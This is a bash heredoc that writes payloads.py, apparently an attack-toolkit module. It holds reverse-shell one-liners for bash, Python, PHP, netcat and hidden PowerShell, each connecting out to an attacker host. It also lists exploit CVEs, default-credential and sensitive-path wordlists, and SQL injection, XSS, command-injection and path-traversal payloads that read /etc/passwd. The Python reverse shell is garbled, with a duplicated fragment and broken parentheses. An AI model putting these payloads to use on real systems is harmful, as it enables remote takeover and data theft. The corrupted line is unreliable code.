
```bash
cat > payloads.py << 'EOF'
SHELLS = [
    {"id": 1, "name": "Bash TCP", "payload": 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1', "os": "linux"},
    {"id": 2, "name": "Python", "payload": "python3 -c 'import 
socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(socket,subprocess,os;s=socket.socket();s.connect(\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "os": "linux"},
    {"id": 3, "name": "PHP", "payload": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 
2>&3\");'", "os": "linux"},
    {"id": 4, "name": "Netcat", "payload": "nc -e /bin/sh {LHOST} {LPORT}", "os": "linux"},
    {"id": 5, "name": "PowerShell", "payload": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command 
\"New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT})\"", "os": "windows"},
]

EXPLOITS = [
    {"cve": "CVE-2024-0001", "name": "Spring RCE", "severity": "critical"},
    {"cve": "CVE-2023-44487", "name": "HTTP/2 Rapid Reset", "severity": "high"},
    {"cve": "CVE-2023-4863", "name": "Chrome Heap Overflow", "severity": "critical"},
    {"cve": "CVE-2023-22515", "name": "Confluence RCE", "severity": "critical"},
    {"cve": "CVE-2023-4911", "name": "Looney Tunables", "severity": "high"},
]

WORDLISTS = {
    "usernames": ["admin", "root", "user", "test", "guest", "administrator", "operator", "webadmin", 
"dbadmin", "sysadmin"],
    "passwords": ["password", "123456", "12345678", "qwerty", "abc123", "monkey", "letmein", "trustno1", 
"dragon", "baseball"],
    "paths": ["/admin", "/login", "/wp-admin", "/phpmyadmin", "/backup", "/config", "/.git", "/.env", "/api", 
"/server-status"],
    "subdomains": ["www", "mail", "ftp", "webmail", "smtp", "pop", "ns1", "cpanel", "whm", "admin", "blog", 
"forum", "test", "dev", "backup", "api"]
}

WEB_PAYLOADS = {
    "sql_injection": ["' OR '1'='1", "' OR '1'='1' --", "'; DROP TABLE users--", "admin'--", "1' AND '1'='1"],
    "xss": ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg onload=alert('XSS')>", 
"javascript:alert('XSS')"],
    "command_injection": ["; ls -la", "| cat /etc/passwd", "`whoami`", "$(whoami)", "; id"],
    "lfi": ["../../../etc/passwd", "/etc/passwd", "../../../../../../etc/passwd", "....//....//etc/passwd"]
}

def get_shell(shell_id):
    for s in SHELLS:
        if s['id'] == shell_id:
            return s
    return None

